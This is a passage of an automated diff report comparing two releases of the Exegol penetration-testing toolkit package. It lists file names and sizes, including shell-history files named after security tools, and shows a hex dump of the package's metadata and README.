+-rw-r--r--   0 runner    (1001) docker     (123)      329 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/responder
+-rw-r--r--   0 runner    (1001) docker     (123)       21 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/rlwrap
+-rw-r--r--   0 runner    (1001) docker     (123)       43 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/robotstester
+-rw-r--r--   0 runner    (1001) docker     (123)      247 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/ruler
+-rw-r--r--   0 runner    (1001) docker     (123)       79 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/rusthound
+-rw-r--r--   0 runner    (1001) docker     (123)      210 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/samba
+-rw-r--r--   0 runner    (1001) docker     (123)       44 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/semgrep
+-rw-r--r--   0 runner    (1001) docker     (123)       80 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/shadowcoerce
+-rw-r--r--   0 runner    (1001) docker     (123)       94 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/shellerator
+-rw-r--r--   0 runner    (1001) docker     (123)      254 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/shuffledns
+-rw-r--r--   0 runner    (1001) docker     (123)       40 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/simplyemail
+-rw-r--r--   0 runner    (1001) docker     (123)      149 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/smartbrute
+-rw-r--r--   0 runner    (1001) docker     (123)      193 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/smbclient
+-rw-r--r--   0 runner    (1001) docker     (123)      100 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/smbmap
+-rw-r--r--   0 runner    (1001) docker     (123)      315 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/smtp-user-enum
+-rw-r--r--   0 runner    (1001) docker     (123)       30 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/smuggler
+-rw-r--r--   0 runner    (1001) docker     (123)       69 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/snmp
+-rw-r--r--   0 runner    (1001) docker     (123)       68 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/spiderfoot
+-rw-r--r--   0 runner    (1001) docker     (123)      216 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/sprayhound
+-rw-r--r--   0 runner    (1001) docker     (123)       48 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/sqlmap
+-rw-r--r--   0 runner    (1001) docker     (123)       37 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/ssh
+-rw-r--r--   0 runner    (1001) docker     (123)      202 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/sslyze
+-rw-r--r--   0 runner    (1001) docker     (123)      322 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/subfinder
+-rw-r--r--   0 runner    (1001) docker     (123)       26 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/sublist3r
+-rw-r--r--   0 runner    (1001) docker     (123)      123 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/swaks
+-rw-r--r--   0 runner    (1001) docker     (123)      129 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/tailscale
+-rw-r--r--   0 runner    (1001) docker     (123)       87 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/targetedkerberoast
+-rw-r--r--   0 runner    (1001) docker     (123)       18 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/testdisk
+-rw-r--r--   0 runner    (1001) docker     (123)       96 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/theharvester
+-rw-r--r--   0 runner    (1001) docker     (123)      561 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/tls-map
+-rw-r--r--   0 runner    (1001) docker     (123)       35 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/tls-scanner
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/toutatis
+-rw-r--r--   0 runner    (1001) docker     (123)       99 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/twint
+-rw-r--r--   0 runner    (1001) docker     (123)       78 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/updog
+-rw-r--r--   0 runner    (1001) docker     (123)      741 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/volatility3
+-rw-r--r--   0 runner    (1001) docker     (123)       21 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/waybackurls
+-rw-r--r--   0 runner    (1001) docker     (123)       83 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/webclientservicescanner
+-rw-r--r--   0 runner    (1001) docker     (123)      650 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/wfuzz
+-rw-r--r--   0 runner    (1001) docker     (123)       37 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/whatportis
+-rw-r--r--   0 runner    (1001) docker     (123)       90 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/windapsearch
+-rw-r--r--   0 runner    (1001) docker     (123)      370 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/wpscan
+-rw-r--r--   0 runner    (1001) docker     (123)       75 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/xfreerdp
+-rw-r--r--   0 runner    (1001) docker     (123)      120 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/zerologon
+-rw-r--r--   0 runner    (1001) docker     (123)     2320 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/zshrc
+-rw-r--r--   0 runner    (1001) docker     (123)     1702 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/web.dockerfile
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-05-10 03:26:51.767214 Exegol-4.2.0/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)     2635 2023-05-10 03:26:24.000000 Exegol-4.2.0/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.767214 Exegol-4.2.0/tests/
+-rw-r--r--   0 runner    (1001) docker     (123)       87 2023-05-10 03:26:24.000000 Exegol-4.2.0/tests/test_exegol.py
```

### Comparing `Exegol-4.1.1/Exegol.egg-info/PKG-INFO` & `Exegol-4.2.0/README.md`

 * *Files 16% similar despite different names*

```diff
@@ -1,347 +1,338 @@
-00000000: 4d65 7461 6461 7461 2d56 6572 7369 6f6e  Metadata-Version
-00000010: 3a20 322e 310a 4e61 6d65 3a20 4578 6567  : 2.1.Name: Exeg
-00000020: 6f6c 0a56 6572 7369 6f6e 3a20 342e 312e  ol.Version: 4.1.
-00000030: 310a 5375 6d6d 6172 793a 2050 7974 686f  1.Summary: Pytho
-00000040: 6e20 7772 6170 7065 7220 746f 2075 7365  n wrapper to use
-00000050: 2045 7865 676f 6c2c 2061 2063 6f6e 7461   Exegol, a conta
-00000060: 696e 6572 2062 6173 6564 2066 756c 6c79  iner based fully
-00000070: 2066 6561 7475 7265 6420 616e 6420 636f   featured and co
-00000080: 6d6d 756e 6974 792d 6472 6976 656e 2068  mmunity-driven h
-00000090: 6163 6b69 6e67 2065 6e76 6972 6f6e 6d65  acking environme
-000000a0: 6e74 2e0a 486f 6d65 2d70 6167 653a 2068  nt..Home-page: h
-000000b0: 7474 7073 3a2f 2f67 6974 6875 622e 636f  ttps://github.co
-000000c0: 6d2f 5468 6550 6f72 6773 2f45 7865 676f  m/ThePorgs/Exego
-000000d0: 6c0a 4175 7468 6f72 3a20 5368 7574 646f  l.Author: Shutdo
-000000e0: 776e 2026 2044 7261 6d65 6c61 630a 4175  wn & Dramelac.Au
-000000f0: 7468 6f72 2d65 6d61 696c 3a20 6e77 6f64  thor-email: nwod
-00000100: 7475 6873 4070 6d2e 6d65 0a4c 6963 656e  tuhs@pm.me.Licen
-00000110: 7365 3a20 474e 5520 2847 504c 7633 290a  se: GNU (GPLv3).
-00000120: 5072 6f6a 6563 742d 5552 4c3a 2042 7567  Project-URL: Bug
-00000130: 2052 6570 6f72 7473 2c20 6874 7470 733a   Reports, https:
-00000140: 2f2f 6769 7468 7562 2e63 6f6d 2f54 6865  //github.com/The
-00000150: 506f 7267 732f 4578 6567 6f6c 2f69 7373  Porgs/Exegol/iss
-00000160: 7565 730a 5072 6f6a 6563 742d 5552 4c3a  ues.Project-URL:
-00000170: 2053 6f75 7263 652c 2068 7474 7073 3a2f   Source, https:/
-00000180: 2f67 6974 6875 622e 636f 6d2f 5468 6550  /github.com/TheP
-00000190: 6f72 6773 2f45 7865 676f 6c0a 5072 6f6a  orgs/Exegol.Proj
-000001a0: 6563 742d 5552 4c3a 2044 6f63 756d 656e  ect-URL: Documen
-000001b0: 7461 7469 6f6e 2c20 6874 7470 733a 2f2f  tation, https://
-000001c0: 6578 6567 6f6c 2e72 6561 6474 6865 646f  exegol.readthedo
-000001d0: 6373 2e69 6f2f 0a50 726f 6a65 6374 2d55  cs.io/.Project-U
-000001e0: 524c 3a20 4675 6e64 696e 672c 2068 7474  RL: Funding, htt
-000001f0: 7073 3a2f 2f70 6174 7265 6f6e 2e63 6f6d  ps://patreon.com
-00000200: 2f6e 776f 6474 7568 730a 4b65 7977 6f72  /nwodtuhs.Keywor
-00000210: 6473 3a20 7065 6e74 6573 7420 7265 6474  ds: pentest redt
-00000220: 6561 6d20 6374 6620 6578 6567 6f6c 0a43  eam ctf exegol.C
-00000230: 6c61 7373 6966 6965 723a 2044 6576 656c  lassifier: Devel
-00000240: 6f70 6d65 6e74 2053 7461 7475 7320 3a3a  opment Status ::
-00000250: 2035 202d 2050 726f 6475 6374 696f 6e2f   5 - Production/
-00000260: 5374 6162 6c65 0a43 6c61 7373 6966 6965  Stable.Classifie
-00000270: 723a 2050 726f 6772 616d 6d69 6e67 204c  r: Programming L
-00000280: 616e 6775 6167 6520 3a3a 2050 7974 686f  anguage :: Pytho
-00000290: 6e20 3a3a 2033 2e37 0a43 6c61 7373 6966  n :: 3.7.Classif
-000002a0: 6965 723a 2050 726f 6772 616d 6d69 6e67  ier: Programming
-000002b0: 204c 616e 6775 6167 6520 3a3a 2050 7974   Language :: Pyt
-000002c0: 686f 6e20 3a3a 2033 2e38 0a43 6c61 7373  hon :: 3.8.Class
-000002d0: 6966 6965 723a 2050 726f 6772 616d 6d69  ifier: Programmi
-000002e0: 6e67 204c 616e 6775 6167 6520 3a3a 2050  ng Language :: P
-000002f0: 7974 686f 6e20 3a3a 2033 2e39 0a43 6c61  ython :: 3.9.Cla
-00000300: 7373 6966 6965 723a 2050 726f 6772 616d  ssifier: Program
-00000310: 6d69 6e67 204c 616e 6775 6167 6520 3a3a  ming Language ::
-00000320: 2050 7974 686f 6e20 3a3a 2033 2e31 300a   Python :: 3.10.
-00000330: 436c 6173 7369 6669 6572 3a20 4c69 6365  Classifier: Lice
-00000340: 6e73 6520 3a3a 204f 5349 2041 7070 726f  nse :: OSI Appro
-00000350: 7665 6420 3a3a 2047 4e55 2047 656e 6572  ved :: GNU Gener
-00000360: 616c 2050 7562 6c69 6320 4c69 6365 6e73  al Public Licens
-00000370: 6520 7633 2028 4750 4c76 3329 0a43 6c61  e v3 (GPLv3).Cla
-00000380: 7373 6966 6965 723a 204f 7065 7261 7469  ssifier: Operati
-00000390: 6e67 2053 7973 7465 6d20 3a3a 204f 5320  ng System :: OS 
-000003a0: 496e 6465 7065 6e64 656e 740a 5265 7175  Independent.Requ
-000003b0: 6972 6573 2d50 7974 686f 6e3a 203e 3d33  ires-Python: >=3
-000003c0: 2e37 2c20 3c34 0a44 6573 6372 6970 7469  .7, <4.Descripti
-000003d0: 6f6e 2d43 6f6e 7465 6e74 2d54 7970 653a  on-Content-Type:
-000003e0: 2074 6578 742f 6d61 726b 646f 776e 0a4c   text/markdown.L
-000003f0: 6963 656e 7365 2d46 696c 653a 204c 4943  icense-File: LIC
-00000400: 454e 5345 0a0a 3c64 6976 2061 6c69 676e  ENSE..<div align
-00000410: 3d22 6365 6e74 6572 223e 0a20 203c 696d  ="center">.  <im
-00000420: 6720 616c 743d 2265 7865 676f 6c20 6c6f  g alt="exegol lo
-00000430: 676f 2220 7769 6474 683d 2236 3030 2220  go" width="600" 
-00000440: 7372 633d 2268 7474 7073 3a2f 2f72 6177  src="https://raw
-00000450: 2e67 6974 6875 6275 7365 7263 6f6e 7465  .githubuserconte
-00000460: 6e74 2e63 6f6d 2f54 6865 506f 7267 732f  nt.com/ThePorgs/
-00000470: 4578 6567 6f6c 2d64 6f63 732f 6d61 696e  Exegol-docs/main
-00000480: 2f2e 6173 7365 7473 2f72 6f75 6e64 6564  /.assets/rounded
-00000490: 5f73 6f63 6961 6c5f 7072 6576 6965 772e  _social_preview.
-000004a0: 706e 6722 3e0a 2020 3c62 723e 3c62 723e  png">.  <br><br>
-000004b0: 0a20 203c 6120 6872 6566 3d22 6874 7470  .  <a href="http
-000004c0: 733a 2f2f 7079 7069 2e6f 7267 2f70 726f  s://pypi.org/pro
-000004d0: 6a65 6374 2f45 7865 676f 6c22 2074 6974  ject/Exegol" tit
-000004e0: 6c65 3d22 223e 3c69 6d67 2073 7263 3d22  le=""><img src="
-000004f0: 6874 7470 733a 2f2f 696d 672e 7368 6965  https://img.shie
-00000500: 6c64 732e 696f 2f70 7970 692f 762f 4578  lds.io/pypi/v/Ex
-00000510: 6567 6f6c 3f63 6f6c 6f72 3d69 6e66 6f72  egol?color=infor
-00000520: 6d61 7469 6f6e 616c 2220 616c 743d 2270  mational" alt="p
-00000530: 6970 2070 6163 6b61 6765 2076 6572 7369  ip package versi
-00000540: 6f6e 223e 3c2f 613e 0a20 203c 696d 6720  on"></a>.  <img 
-00000550: 616c 743d 2250 7974 686f 6e33 2e37 2220  alt="Python3.7" 
-00000560: 7372 633d 2268 7474 7073 3a2f 2f69 6d67  src="https://img
-00000570: 2e73 6869 656c 6473 2e69 6f2f 6261 6467  .shields.io/badg
-00000580: 652f 5079 7468 6f6e 2d33 2e37 2b2d 696e  e/Python-3.7+-in
-00000590: 666f 726d 6174 696f 6e61 6c22 3e0a 2020  formational">.  
-000005a0: 3c61 2068 7265 663d 2268 7474 7073 3a2f  <a href="https:/
-000005b0: 2f70 6570 792e 7465 6368 2f70 726f 6a65  /pepy.tech/proje
-000005c0: 6374 2f65 7865 676f 6c22 2074 6974 6c65  ct/exegol" title
-000005d0: 3d22 223e 3c69 6d67 2073 7263 3d22 6874  =""><img src="ht
-000005e0: 7470 733a 2f2f 7374 6174 6963 2e70 6570  tps://static.pep
-000005f0: 792e 7465 6368 2f70 6572 736f 6e61 6c69  y.tech/personali
-00000600: 7a65 642d 6261 6467 652f 6578 6567 6f6c  zed-badge/exegol
-00000610: 3f70 6572 696f 643d 746f 7461 6c26 756e  ?period=total&un
-00000620: 6974 733d 696e 7465 726e 6174 696f 6e61  its=internationa
-00000630: 6c5f 7379 7374 656d 266c 6566 745f 636f  l_system&left_co
-00000640: 6c6f 723d 6772 6579 2672 6967 6874 5f63  lor=grey&right_c
-00000650: 6f6c 6f72 3d62 7269 6768 7467 7265 656e  olor=brightgreen
-00000660: 266c 6566 745f 7465 7874 3d44 6f77 6e6c  &left_text=Downl
-00000670: 6f61 6473 2220 616c 743d 2270 6970 2073  oads" alt="pip s
-00000680: 7461 7473 223e 3c2f 613e 0a20 203c 6272  tats"></a>.  <br
-00000690: 3e3c 6272 3e0a 2020 3c69 6d67 2061 6c74  ><br>.  <img alt
-000006a0: 3d22 6c61 7465 7374 2063 6f6d 6d69 7420  ="latest commit 
-000006b0: 6f6e 206d 6173 7465 7222 2073 7263 3d22  on master" src="
-000006c0: 6874 7470 733a 2f2f 696d 672e 7368 6965  https://img.shie
-000006d0: 6c64 732e 696f 2f67 6974 6875 622f 6c61  lds.io/github/la
-000006e0: 7374 2d63 6f6d 6d69 742f 5468 6550 6f72  st-commit/ThePor
-000006f0: 6773 2f45 7865 676f 6c2f 6d61 7374 6572  gs/Exegol/master
-00000700: 3f6c 6162 656c 3d6c 6174 6573 7425 3230  ?label=latest%20
-00000710: 7265 6c65 6173 6522 3e0a 2020 3c69 6d67  release">.  <img
-00000720: 2061 6c74 3d22 6c61 7465 7374 2063 6f6d   alt="latest com
-00000730: 6d69 7420 6f6e 2064 6576 2220 7372 633d  mit on dev" src=
-00000740: 2268 7474 7073 3a2f 2f69 6d67 2e73 6869  "https://img.shi
-00000750: 656c 6473 2e69 6f2f 6769 7468 7562 2f6c  elds.io/github/l
-00000760: 6173 742d 636f 6d6d 6974 2f54 6865 506f  ast-commit/ThePo
-00000770: 7267 732f 4578 6567 6f6c 2f64 6576 3f6c  rgs/Exegol/dev?l
-00000780: 6162 656c 3d6c 6174 6573 7425 3230 6465  abel=latest%20de
-00000790: 7622 3e0a 2020 3c62 723e 3c62 723e 0a20  v">.  <br><br>. 
-000007a0: 203c 696d 6720 616c 743d 2263 7572 7265   <img alt="curre
-000007b0: 6e74 2076 6572 7369 6f6e 2220 7372 633d  nt version" src=
-000007c0: 2268 7474 7073 3a2f 2f69 6d67 2e73 6869  "https://img.shi
-000007d0: 656c 6473 2e69 6f2f 6261 6467 652f 6c69  elds.io/badge/li
-000007e0: 6e75 782d 7375 7070 6f72 7465 642d 7375  nux-supported-su
-000007f0: 6363 6573 7322 3e0a 2020 3c69 6d67 2061  ccess">.  <img a
-00000800: 6c74 3d22 6375 7272 656e 7420 7665 7273  lt="current vers
-00000810: 696f 6e22 2073 7263 3d22 6874 7470 733a  ion" src="https:
-00000820: 2f2f 696d 672e 7368 6965 6c64 732e 696f  //img.shields.io
-00000830: 2f62 6164 6765 2f77 696e 646f 7773 2d73  /badge/windows-s
-00000840: 7570 706f 7274 6564 2d73 7563 6365 7373  upported-success
-00000850: 223e 0a20 203c 696d 6720 616c 743d 2263  ">.  <img alt="c
-00000860: 7572 7265 6e74 2076 6572 7369 6f6e 2220  urrent version" 
-00000870: 7372 633d 2268 7474 7073 3a2f 2f69 6d67  src="https://img
-00000880: 2e73 6869 656c 6473 2e69 6f2f 6261 6467  .shields.io/badg
-00000890: 652f 6d61 632d 7375 7070 6f72 7465 642d  e/mac-supported-
-000008a0: 7375 6363 6573 7322 3e0a 2020 3c62 723e  success">.  <br>
-000008b0: 0a20 203c 696d 6720 616c 743d 2261 6d64  .  <img alt="amd
-000008c0: 3634 2220 7372 633d 2268 7474 7073 3a2f  64" src="https:/
-000008d0: 2f69 6d67 2e73 6869 656c 6473 2e69 6f2f  /img.shields.io/
-000008e0: 6261 6467 652f 616d 6436 3425 3230 2878  badge/amd64%20(x
-000008f0: 3836 5f5f 3634 292d 7375 7070 6f72 7465  86__64)-supporte
-00000900: 642d 7375 6363 6573 7322 3e0a 2020 3c69  d-success">.  <i
-00000910: 6d67 2061 6c74 3d22 6172 6d36 3422 2073  mg alt="arm64" s
-00000920: 7263 3d22 6874 7470 733a 2f2f 696d 672e  rc="https://img.
-00000930: 7368 6965 6c64 732e 696f 2f62 6164 6765  shields.io/badge
-00000940: 2f61 726d 3634 2532 3028 6161 7263 6836  /arm64%20(aarch6
-00000950: 3429 2d73 7570 706f 7274 6564 2d73 7563  4)-supported-suc
-00000960: 6365 7373 223e 0a20 203c 6272 3e3c 6272  cess">.  <br><br
-00000970: 3e0a 2020 3c61 2068 7265 663d 2268 7474  >.  <a href="htt
-00000980: 7073 3a2f 2f74 7769 7474 6572 2e63 6f6d  ps://twitter.com
-00000990: 2f69 6e74 656e 742f 666f 6c6c 6f77 3f73  /intent/follow?s
-000009a0: 6372 6565 6e5f 6e61 6d65 3d5f 6e77 6f64  creen_name=_nwod
-000009b0: 7475 6873 2220 7469 746c 653d 2246 6f6c  tuhs" title="Fol
-000009c0: 6c6f 7722 3e3c 696d 6720 7372 633d 2268  low"><img src="h
-000009d0: 7474 7073 3a2f 2f69 6d67 2e73 6869 656c  ttps://img.shiel
-000009e0: 6473 2e69 6f2f 7477 6974 7465 722f 666f  ds.io/twitter/fo
-000009f0: 6c6c 6f77 2f5f 6e77 6f64 7475 6873 3f6c  llow/_nwodtuhs?l
-00000a00: 6162 656c 3d53 6875 7464 6f77 6e26 7374  abel=Shutdown&st
-00000a10: 796c 653d 736f 6369 616c 2220 616c 743d  yle=social" alt=
-00000a20: 2254 7769 7474 6572 2053 6875 7464 6f77  "Twitter Shutdow
-00000a30: 6e22 3e3c 2f61 3e0a 2020 3c61 2068 7265  n"></a>.  <a hre
-00000a40: 663d 2268 7474 7073 3a2f 2f74 7769 7474  f="https://twitt
-00000a50: 6572 2e63 6f6d 2f69 6e74 656e 742f 666f  er.com/intent/fo
-00000a60: 6c6c 6f77 3f73 6372 6565 6e5f 6e61 6d65  llow?screen_name
-00000a70: 3d44 7261 6d65 6c61 635f 2220 7469 746c  =Dramelac_" titl
-00000a80: 653d 2246 6f6c 6c6f 7722 3e3c 696d 6720  e="Follow"><img 
-00000a90: 7372 633d 2268 7474 7073 3a2f 2f69 6d67  src="https://img
-00000aa0: 2e73 6869 656c 6473 2e69 6f2f 7477 6974  .shields.io/twit
-00000ab0: 7465 722f 666f 6c6c 6f77 2f44 7261 6d65  ter/follow/Drame
-00000ac0: 6c61 635f 3f6c 6162 656c 3d44 7261 6d65  lac_?label=Drame
-00000ad0: 6c61 6326 7374 796c 653d 736f 6369 616c  lac&style=social
-00000ae0: 2220 616c 743d 2254 7769 7474 6572 2044  " alt="Twitter D
-00000af0: 7261 6d65 6c61 6322 3e3c 2f61 3e0a 2020  ramelac"></a>.  
-00000b00: 3c62 723e 3c62 723e 0a20 203c 6120 6872  <br><br>.  <a hr
-00000b10: 6566 3d22 6874 7470 733a 2f2f 6469 7363  ef="https://disc
-00000b20: 6f72 642e 6767 2f63 5854 6879 7037 4436  ord.gg/cXThyp7D6
-00000b30: 5022 2074 6974 6c65 3d22 4a6f 696e 2075  P" title="Join u
-00000b40: 7320 6f6e 2044 6973 636f 7264 223e 3c69  s on Discord"><i
-00000b50: 6d67 2073 7263 3d22 6874 7470 733a 2f2f  mg src="https://
-00000b60: 7261 772e 6769 7468 7562 7573 6572 636f  raw.githubuserco
-00000b70: 6e74 656e 742e 636f 6d2f 5468 6550 6f72  ntent.com/ThePor
-00000b80: 6773 2f45 7865 676f 6c2d 646f 6373 2f6d  gs/Exegol-docs/m
-00000b90: 6169 6e2f 2e61 7373 6574 732f 6469 7363  ain/.assets/disc
-00000ba0: 6f72 645f 6a6f 696e 5f75 732e 706e 6722  ord_join_us.png"
-00000bb0: 2077 6964 7468 3d22 3135 3022 2061 6c74   width="150" alt
-00000bc0: 3d22 4a6f 696e 2075 7320 6f6e 2044 6973  ="Join us on Dis
-00000bd0: 636f 7264 223e 3c2f 613e 0a20 203c 6272  cord"></a>.  <br
-00000be0: 3e3c 6272 3e0a 3c2f 6469 763e 0a0a 3e20  ><br>.</div>..> 
-00000bf0: 4578 6567 6f6c 2069 7320 6120 636f 6d6d  Exegol is a comm
-00000c00: 756e 6974 792d 6472 6976 656e 2068 6163  unity-driven hac
-00000c10: 6b69 6e67 2065 6e76 6972 6f6e 6d65 6e74  king environment
-00000c20: 2c20 706f 7765 7266 756c 2061 6e64 2079  , powerful and y
-00000c30: 6574 2073 696d 706c 6520 656e 6f75 6768  et simple enough
-00000c40: 2074 6f20 6265 2075 7365 6420 6279 2061   to be used by a
-00000c50: 6e79 6f6e 6520 696e 2064 6179 2074 6f20  nyone in day to 
-00000c60: 6461 7920 656e 6761 6765 6d65 6e74 732e  day engagements.
-00000c70: 2045 7865 676f 6c20 6973 2074 6865 2062   Exegol is the b
-00000c80: 6573 7420 736f 6c75 7469 6f6e 2074 6f20  est solution to 
-00000c90: 6465 706c 6f79 2070 6f77 6572 6675 6c20  deploy powerful 
-00000ca0: 6861 636b 696e 6720 656e 7669 726f 6e6d  hacking environm
-00000cb0: 656e 7473 2073 6563 7572 656c 792c 2065  ents securely, e
-00000cc0: 6173 696c 792c 2070 726f 6665 7373 696f  asily, professio
-00000cd0: 6e61 6c6c 792e 0a3e 2045 7865 676f 6c20  nally..> Exegol 
-00000ce0: 6669 7473 2070 656e 7465 7374 6572 732c  fits pentesters,
-00000cf0: 2043 5446 2070 6c61 7965 7273 2c20 6275   CTF players, bu
-00000d00: 6720 626f 756e 7479 2068 756e 7465 7273  g bounty hunters
-00000d10: 2c20 7265 7365 6172 6368 6572 732c 2062  , researchers, b
-00000d20: 6567 696e 6e65 7273 2061 6e64 2061 6476  eginners and adv
-00000d30: 616e 6365 6420 7573 6572 732c 2064 6566  anced users, def
-00000d40: 656e 6465 7273 2c20 6672 6f6d 2073 7479  enders, from sty
-00000d50: 6c69 7368 206d 6163 4f53 2075 7365 7273  lish macOS users
-00000d60: 2061 6e64 2063 6f72 706f 7261 7465 2057   and corporate W
-00000d70: 696e 646f 7773 2070 726f 7320 746f 2055  indows pros to U
-00000d80: 4e49 582d 6c69 6b65 2070 6f77 6572 2075  NIX-like power u
-00000d90: 7365 7273 2e0a 0a23 2047 6574 7469 6e67  sers...# Getting
-00000da0: 2073 7461 7274 6564 0a0a 596f 7520 6361   started..You ca
-00000db0: 6e20 7265 6665 7220 746f 2074 6865 205b  n refer to the [
-00000dc0: 4578 6567 6f6c 2064 6f63 756d 656e 7461  Exegol documenta
-00000dd0: 7469 6f6e 735d 2868 7474 7073 3a2f 2f65  tions](https://e
-00000de0: 7865 676f 6c2e 7265 6164 7468 6564 6f63  xegol.readthedoc
-00000df0: 732e 696f 2f29 2e0a 0a23 2320 5072 6f6a  s.io/)...## Proj
-00000e00: 6563 7420 7374 7275 6374 7572 650a 0a42  ect structure..B
-00000e10: 656c 6f77 2061 7265 2073 6f6d 6520 6275  elow are some bu
-00000e20: 6c6c 6574 2070 6f69 6e74 7320 746f 2062  llet points to b
-00000e30: 6574 7465 7220 756e 6465 7273 7461 6e64  etter understand
-00000e40: 2068 6f77 2045 7865 676f 6c20 776f 726b   how Exegol work
-00000e50: 730a 2d20 5468 6973 2072 6570 6f73 6974  s.- This reposit
-00000e60: 6f72 7920 285b 4578 6567 6f6c 5d28 6874  ory ([Exegol](ht
-00000e70: 7470 733a 2f2f 6769 7468 7562 2e63 6f6d  tps://github.com
-00000e80: 2f54 6865 506f 7267 732f 4578 6567 6f6c  /ThePorgs/Exegol
-00000e90: 2929 2063 6f6e 7461 696e 7320 7468 6520  )) contains the 
-00000ea0: 636f 6465 2066 6f72 2074 6865 2050 7974  code for the Pyt
-00000eb0: 686f 6e20 7772 6170 7065 722e 2049 7427  hon wrapper. It'
-00000ec0: 7320 7468 6520 656e 7472 7970 6f69 6e74  s the entrypoint
-00000ed0: 206f 6620 7468 6520 4578 6567 6f6c 2070   of the Exegol p
-00000ee0: 726f 6a65 6374 2e20 5468 6520 7772 6170  roject. The wrap
-00000ef0: 7065 7220 6361 6e20 6265 2069 6e73 7461  per can be insta
-00000f00: 6c6c 6564 2066 726f 6d20 736f 7572 6365  lled from source
-00000f10: 732c 2062 7574 205b 6120 5079 5049 2070  s, but [a PyPI p
-00000f20: 6163 6b61 6765 5d28 6874 7470 733a 2f2f  ackage](https://
-00000f30: 7079 7069 2e6f 7267 2f70 726f 6a65 6374  pypi.org/project
-00000f40: 2f45 7865 676f 6c2f 2920 6973 2061 7661  /Exegol/) is ava
-00000f50: 696c 6162 6c65 2e0a 2d20 5468 6520 5b45  ilable..- The [E
-00000f60: 7865 676f 6c2d 696d 6167 6573 5d28 6874  xegol-images](ht
-00000f70: 7470 733a 2f2f 6769 7468 7562 2e63 6f6d  tps://github.com
-00000f80: 2f54 6865 506f 7267 732f 4578 6567 6f6c  /ThePorgs/Exegol
-00000f90: 2d69 6d61 6765 7329 2072 6570 6f20 6973  -images) repo is
-00000fa0: 206c 6f61 6465 6420 6173 2061 2073 7562   loaded as a sub
-00000fb0: 6d6f 6475 6c65 2e20 4974 2069 6e63 6c75  module. It inclu
-00000fc0: 6465 7320 616c 6c20 6e65 6365 7373 6172  des all necessar
-00000fd0: 7920 6173 7365 7473 2074 6f20 6275 696c  y assets to buil
-00000fe0: 6420 446f 636b 6572 2069 6d61 6765 732e  d Docker images.
-00000ff0: 204e 6f74 6162 656e 653a 2074 6865 2069   Notabene: the i
-00001000: 6d61 6765 2061 7265 2061 6c72 6561 6479  mage are already
-00001010: 2062 7569 6c74 2061 6e64 206f 6666 6572   built and offer
